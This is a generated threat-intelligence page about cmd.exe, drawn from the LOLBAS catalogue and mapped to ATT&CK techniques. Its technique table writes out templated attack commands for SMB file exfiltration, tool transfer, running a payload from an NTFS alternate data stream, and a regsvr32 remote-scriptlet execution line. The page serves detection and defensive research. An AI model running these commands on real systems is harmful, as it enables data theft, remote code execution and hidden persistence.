---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Cmd.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `cmd.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Cmd.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

The command-line interpreter in Windows

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/cmd.md)
- Source verification: [source record](../../sources/lolbas/cmd.exe.md)

## Aliases

- `Cmd.exe`
- `cmd.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol](../../attack/techniques/T1048.003-exfiltration-over-unencrypted-non-c2-protocol.md) | explicit | source | Command metadata lists T1048.003: type {PATH_ABSOLUTE} > {PATH_SMB} |
| [T1059.003 - Windows Command Shell](../../attack/techniques/T1059.003-windows-command-shell.md) | explicit | source | Command metadata lists T1059.003: cmd.exe - < {PATH}:payload.bat |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: type {PATH_SMB} > {PATH_ABSOLUTE} |
| [T1564.004 - NTFS File Attributes](../../attack/techniques/T1564.004-ntfs-file-attributes.md) | explicit | source | Command metadata lists T1564.004: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/cmd.exe.md)

## Source Verification

[source record](../../sources/lolbas/cmd.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@yeyint_mth'
Person: r0lan
- Handle: '@mr_0rng'
Person: Mr.0range
Author: Ye Yint Min Thu Htut
Commands:
- Category: ADS
```
